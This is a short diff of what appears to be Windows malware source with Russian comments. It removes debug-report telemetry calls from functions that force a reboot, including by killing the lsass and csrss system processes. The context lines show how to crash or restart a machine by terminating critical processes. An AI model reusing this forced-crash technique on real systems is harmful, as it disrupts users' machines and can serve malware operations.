@@ -35,10 +35,6 @@ void RebootMethod_Normal()
 	PP_RETURNIF1(exit_windows_result == FALSE);
 	
 	PP_DPRINTF("RebootMethod_Normal: successfuly finished.");
-
-	//141_d завершение метода ребута №1
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("141_d"));
-
 }
 
 bool KillSystemProcessById(DWORD pid)
@@ -126,15 +122,10 @@ void KillByFilter(ProcessFilterFunction filter)
 void RebootMethod_KillLsass()
 {
 	KillByFilter(Filter_Lsass);
-
-	//142_d завершение метода ребута №2
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("142_d"));
 }
 
 void RebootMethod_KillCsrss()
 {
-	//143_d завершение метода ребута №3
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("143_d"));
 	KillByFilter(Filter_Scrss);
 }
 
@@ -151,9 +142,6 @@ void MultiMethodReboot()
 		{"rbm_02", RebootMethod_KillLsass},
 		{"rbm_03", RebootMethod_KillCsrss}
 	};
-
-	//140_d начало попыток ребута
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("140_d"));
 
 	PP_DPRINTF("MultiMethodReboot: Enum each method and run.");
 	for (size_t i=0; i < ARRAYSIZE(method_table); i++)
